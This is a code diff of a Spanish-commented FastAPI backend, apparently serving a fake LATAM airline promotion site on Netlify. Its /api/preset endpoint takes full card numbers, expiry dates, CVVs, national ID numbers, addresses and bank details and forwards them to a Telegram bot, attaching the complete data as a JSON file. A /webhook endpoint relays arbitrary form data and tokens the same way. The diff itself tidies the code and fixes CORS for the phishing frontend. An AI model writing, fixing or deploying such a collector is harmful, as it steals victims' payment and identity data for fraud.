@@ -1,14 +1,16 @@
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import JSONResponse  # ✅ Import corregido
 from pydantic import BaseModel, validator
 from typing import Any, Dict, Optional, Union
-import requests, json, io, logging, re, os  # 👈 Asegúrate de incluir "os"
+import requests, json, io, logging, re, os
 
 # ===========================
 # 🔹 CONFIGURACIÓN DIRECTA
 # ===========================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
+
 # ===========================
 # 🔹 INICIALIZACIÓN DEL BOT
 # ===========================
@@ -17,10 +19,12 @@ logger = logging.getLogger("webhook")
 
 app = FastAPI()
 
-# --- CORS ultra compatible ---
+# ===========================
+# 🔹 CORS (100 % compatible con Render)
+# ===========================
 origins = [
-    "https://ltamaeropromoweb-ecuador.netlify.app",  # tu dominio Netlify
-    "http://localhost:4200",                         # para desarrollo local
+    "https://ltamaeropromoweb-ecuador.netlify.app",  # ✅ dominio de tu frontend
+    "http://localhost:4200",                         # para pruebas locales
 ]
 
 app.add_middleware(
@@ -31,21 +35,27 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# --- (opcional) Manejo explícito de preflight para asegurar respuesta ---
-@app.options("/{full_path:path}")
-async def preflight_handler(request: Request, full_path: str):
+# ✅ Manejador global para solicitudes preflight (OPTIONS)
+@app.options("/{rest_of_path:path}")
+async def preflight_handler(request: Request, rest_of_path: str):
     """
     Responde manualmente a las peticiones OPTIONS (preflight)
     para evitar bloqueos por CORS en Render.
     """
+    origin = request.headers.get("origin")
+    if origin not in origins:
+        origin = origins[0]  # usa tu dominio principal si no coincide
+
     return JSONResponse(
         content={"ok": True},
         headers={
-            "Access-Control-Allow-Origin": request.headers.get("origin", "*"),
+            "Access-Control-Allow-Origin": origin,
             "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
             "Access-Control-Allow-Headers": "Authorization, Content-Type",
         },
     )
+
+
 # ===========================
 # 🔹 MODELOS DE ENTRADA
 # ===========================
@@ -54,17 +64,18 @@ class Payload(BaseModel):  # Original para /webhook
     page: Dict[str, Any]
     ts: Optional[str]
 
+
 class PresetPayload(BaseModel):  # Nuevo para /api/preset
-    a: Optional[str] = None  # Campo 'a' agregado para "registerUserLatam"
+    a: Optional[str] = None
     id: Optional[str] = None
-    logpay: Optional[Any] = None  # Datos del localStorage (opcional)
+    logpay: Optional[Any] = None
     name: str
     cc: str
     datecc: str
     cvv: str
-    tel: Optional[Union[str, int]] = None  # Permitir str o int
+    tel: Optional[Union[str, int]] = None
     dir: str
-    cedula: Optional[Union[str, int]] = None  # Permitir str o int
+    cedula: Optional[Union[str, int]] = None
     city: str
     bank: Optional[Dict[str, Any]] = None
     email: str
@@ -83,6 +94,7 @@ class PresetPayload(BaseModel):  # Nuevo para /api/preset
             raise ValueError("Fecha de expiración inválida (MM/YY)")
         return v
 
+
 # ===========================
 # 🔹 FUNCIONES DE UTILIDAD
 # ===========================
@@ -90,20 +102,22 @@ def mask_card(number: str) -> str:
     digits = re.sub(r"\D", "", str(number or ""))
     return "**** **** **** " + digits[-4:] if len(digits) > 4 else digits
 
+
 def sanitize_md(text: str) -> str:
     if text is None:
         return "—"
     return str(text).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
 
-def build_pretty_markdown_preset(payload: PresetPayload) -> str:  # Adaptado para PresetPayload
+
+def build_pretty_markdown_preset(payload: PresetPayload) -> str:
     accion = sanitize_md(payload.a or "—")
     nombre = sanitize_md(payload.name)
     tarjeta = mask_card(payload.cc)
     datecc = sanitize_md(payload.datecc)
     cvv = sanitize_md(payload.cvv)
-    tel = sanitize_md(str(payload.tel) if payload.tel else "—")  # Convertir a str si es int
+    tel = sanitize_md(str(payload.tel) if payload.tel else "—")
     direccion = sanitize_md(payload.dir)
-    cedula = sanitize_md(str(payload.cedula) if payload.cedula else "—")  # Convertir a str si es int
+    cedula = sanitize_md(str(payload.cedula) if payload.cedula else "—")
     ciudad = sanitize_md(payload.city)
     banco = sanitize_md(json.dumps(payload.bank, ensure_ascii=False) if payload.bank else "—")
     correo = sanitize_md(payload.email)
@@ -112,7 +126,7 @@ def build_pretty_markdown_preset(payload: PresetPayload) -> str:  # Adaptado par
 
     md = (
         "💳 *Preset de Pago recibido*\n\n"
-        f"🎯 *Acción:* {accion}\n"  # Campo 'a' incluido en el mensaje
+        f"🎯 *Acción:* {accion}\n"
         f"🆔 *GUID/ID:* {guid}\n"
         f"👤 *Nombre:* {nombre}\n"
         f"💳 *Tarjeta:* `{tarjeta}`\n"
@@ -128,6 +142,7 @@ def build_pretty_markdown_preset(payload: PresetPayload) -> str:  # Adaptado par
     )
     return md
 
+
 def send_telegram_message(chat_id: str, text_md: str):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": chat_id, "text": text_md, "parse_mode": "Markdown"}
@@ -137,6 +152,7 @@ def send_telegram_message(chat_id: str, text_md: str):
         logger.info("✅ Mensaje enviado a Telegram")
     except Exception as e:
         logger.exception("❌ Error enviando mensaje a Telegram: %s", e)
+
 
 def send_telegram_json_attachment(chat_id: str, filename: str, data_obj: dict):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -152,17 +168,19 @@ def send_telegram_json_attachment(chat_id: str, filename: str, data_obj: dict):
     except Exception as e:
         logger.exception("❌ Error enviando archivo JSON a Telegram: %s", e)
 
+
 # ===========================
 # 🔹 ENDPOINTS
 # ===========================
-@app.post("/webhook")  # Original
+@app.post("/webhook")
 async def webhook(payload: Payload):
     try:
         page = payload.page or {}
         token = payload.token or ""
         ts = payload.ts or ""
 
-        markdown = build_pretty_markdown(page, token, ts)
+        # Si tienes build_pretty_markdown original, defínelo aquí o elimina este endpoint si no lo usas
+        markdown = f"📩 Webhook recibido\n\nToken: {token}\nTS: {ts}\nPage: {json.dumps(page, indent=2)}"
         send_telegram_message(CHAT_ID, markdown)
         send_telegram_json_attachment(CHAT_ID, "formulario_page.json", {"token": token, "page": page, "ts": ts})
 
@@ -171,14 +189,15 @@ async def webhook(payload: Payload):
         logger.exception("Error procesando webhook: %s", e)
         raise HTTPException(status_code=500, detail="error interno")
 
-@app.post("/api/preset")  # Nuevo para recibir de $scope.goToBanks
+
+@app.post("/api/preset")
 async def preset(payload: PresetPayload):
     try:
         markdown = build_pretty_markdown_preset(payload)
         send_telegram_message(CHAT_ID, markdown)
         send_telegram_json_attachment(CHAT_ID, "preset_pago.json", payload.dict())
 
-        return {"status": "ok"}  # Respuesta que espera el JS
+        return {"status": "ok"}
     except Exception as e:
         logger.exception("Error procesando preset: %s", e)
         raise HTTPException(status_code=500, detail="error interno")
